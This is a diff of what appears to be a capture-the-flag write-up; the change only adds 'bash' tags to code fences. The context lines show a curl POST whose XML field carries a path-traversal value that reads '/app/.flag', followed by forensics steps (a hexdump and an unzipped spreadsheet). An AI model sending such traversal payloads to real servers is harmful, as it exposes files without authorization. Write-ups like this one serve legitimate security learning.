@@ -46,7 +46,7 @@ def process_data():
 My successful payload used the following `curl` command to retrieve the contents of `/app/.flag`:
 
 
-```
+```bash
 curl -X POST http://4.240.104.200:5004/data \
 -H "Content-Type: application/xml" \
 --data '<?xml version="1.0"?><data><ID>../../../../app/.flag</ID></data>'
@@ -511,7 +511,7 @@ The hint, "Rebellion Bleeds through red but not on the surface. Look past the fi
 A hexdump of the extracted data showed:
 
 
-```
+```bash
 ........  ........  ..}!74am  $_$!_40$  $ef04P{B  TH......  ........
 ```
 
@@ -539,7 +539,7 @@ Next, I unzipped the `.xlsx` file, as Excel files are essentially ZIP archives.
 
 
 
-```
+```bash
 ┌──(l4tmur㉿NOVA)-[/mnt/…/CTF/csecindia-25/Forensics/deepdive]
 └─$ unzip DeepDive.xlsx
 Archive:  DeepDive.xlsx
